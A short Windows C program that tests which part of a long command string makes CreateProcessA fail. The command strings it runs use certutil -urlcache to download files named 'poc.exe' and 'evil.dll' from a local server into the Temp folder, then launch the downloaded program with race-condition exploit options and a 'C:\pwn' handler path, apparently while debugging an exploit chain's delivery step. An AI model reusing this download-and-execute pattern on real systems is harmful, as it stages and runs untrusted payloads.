/* bisect.c — 定位 CreateProcessA gle=5 由命令串哪一段触发 */
#include <stdio.h>
#include <string.h>
#include <windows.h>

static void try(const char* tag, const char* app, const char* cmd) {
  STARTUPINFOA si; PROCESS_INFORMATION pi;
  memset(&si, 0, sizeof si); si.cb = sizeof si;
  SetLastError(0);
  int ok = CreateProcessA(app, (char*)cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
  printf("%-28s ok=%d gle=%lu\n", tag, ok, GetLastError());
  if (ok) { WaitForSingleObject(pi.hProcess, 30000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

int main(void) {
  const char* T = "C:\\Users\\wintest\\AppData\\Local\\Temp\\";
  char s2[600], s3[900], s4[1000], s5[1400];

  try("1 echo", NULL, "cmd.exe /c echo hi");

  strcpy(s2, "cmd.exe /c certutil -urlcache -split -f http://127.0.0.1:8765/poc.exe ");
  strcat(s2, T); strcat(s2, "w2a.exe");
  try("2 one certutil", NULL, s2);

  strcpy(s3, s2);
  strcat(s3, " & certutil -urlcache -split -f http://127.0.0.1:8765/evil.dll ");
  strcat(s3, T); strcat(s3, "w2b.dll");
  try("3 two certutils &", NULL, s3);

  strcpy(s4, s3);
  strcat(s4, " & md "); strcat(s4, T); strcat(s4, "w2db 2>nul & ");
  strcat(s4, T); strcat(s4, "w2a.exe --mode race --iters 8 --calc");
  try("4 + md/run no quotes", NULL, s4);

  strcpy(s5, "cmd.exe /c certutil -urlcache -split -f http://127.0.0.1:8765/poc.exe ");
  strcat(s5, T); strcat(s5, "ms64.exe & certutil -urlcache -split -f http://127.0.0.1:8765/evil.dll ");
  strcat(s5, T); strcat(s5, "ev64.dll & md "); strcat(s5, T);
  strcat(s5, "msdb 2>nul & "); strcat(s5, T);
  strcat(s5, "ms64.exe --handler \"C:\\pwn\\chain-87491-85046-78952-WIN\\w2v.exe\" --db \"");
  strcat(s5, T); strcat(s5, "msdb\" --mode race --iters 8 --pages 41 --calc --dbg");
  try("5 full original", NULL, s5);

  try("6 full + explicit app", "C:\\Windows\\System32\\cmd.exe", s5);
  return 0;
}
